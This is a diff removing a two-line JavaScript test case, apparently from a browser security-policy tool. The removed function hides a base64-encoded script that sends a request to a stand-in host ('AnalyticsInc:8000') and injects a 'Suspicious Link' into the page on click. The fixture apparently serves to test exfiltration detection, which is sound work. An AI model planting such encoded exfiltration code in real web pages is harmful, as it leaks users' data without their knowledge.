@@ -1,2 +1,0 @@
-function exfiltrate_key_history(){var data="PHNjcmlwdD54bWxodHRwPW5ldyBYTUxIdHRwUmVxdWVzdCgpO3htbGh0dHAub3BlbigiR0VUIiwgImh0dHA6Ly9BbmFseXRpY3NJbmM6ODAwMC9zdWJtaXNzaW9uLmh0bWw/dGVzdD1kYXRhNiIsIHRydWUpO3htbGh0dHAuc2VuZChudWxsKTs8L3NjcmlwdD4=",URL="data:text/html;charset=utf-8;base64,"+data,data=document.createElement("a");data.href=URL;JAM.set(data,"innerHTML","Suspicious Link");data.id="mylink";URL=document.getElementsByTagName("body")[0];JAM.call(URL.appendChild,URL,[data])}
-JAM.set(document.getElementById("test"),"onclick",exfiltrate_key_history);
